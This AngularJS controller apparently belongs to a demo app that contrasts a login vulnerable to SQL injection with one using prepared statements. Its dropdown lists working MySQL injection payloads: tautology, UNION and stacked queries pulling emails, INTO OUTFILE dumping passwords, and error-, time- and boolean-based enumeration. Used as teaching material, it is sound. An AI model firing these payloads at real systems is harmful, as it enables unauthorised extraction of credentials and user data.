var app = angular.module("myApp", []);

app.controller("myController", function ($scope, $http) {

    $scope.options = [{name: "--Select Query--", id: ""}, {name: "Simple SQLi", id: "' OR '1'='1' #"}, {
        name: "Union Based",
        id: "' UNION SELECT @@version, email FROM USER #"
    }, {
        name: "Out of Band",
        id: "' UNION SELECT password, email FROM USER INTO OUTFILE '/xampp/tmp/orders.txt' #"
    }, {
        name: "Error Based Find Column Count",
        id: "' order by 1 #"
    }, {
        name: "Error Based DB name",
        id: "' and extractvalue(0x3a,concat(0x3a,(select database()))) #"
    }, {
        name: "Error Based Table Name",
        id: "' and extractvalue(0x3a,concat(0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1))) #"
    }, {
        name: "Error Based Column Name",
        id: "' and extractvalue(0x3a,concat(0x3a,(select column_name from information_schema.columns where table_schema=database() and table_name='user' limit 0,1))) #"
    }, {
        name: "Time Based",
        id: "' OR sleep(10)#"
    }, {
        name: "Boolean Based",
        id: "' OR substring(database(), 1, 1)= 'a'#"
    }, {
        name: "Multi Query",
        id: "'; SELECT @@version, email FROM USER #'"
    }];

    $scope.selectedOption = $scope.options[0];

    $scope.setQuery = function (selectedOption) {
        $scope.password = selectedOption.id;
    };

    $scope.inject = function () {
        $http({
            method: 'POST',
            url: 'login/withInject',
            data: {
                email: $scope.email,
                password: $scope.password
            }
        }).then(function success(response) {
            $scope.userResponse = response.data;
        }, function error(response) {
            $scope.message = response;
        });
    };

    $scope.prevent = function () {
        $http({
            method: 'POST',
            url: 'login/withPreparedStatement',
            data: {
                email: $scope.email,
                password: $scope.password
            }
        }).then(function success(response) {
            $scope.userResponse = response.data;
        }, function error(response) {
            $scope.message = response;
        });
    };
});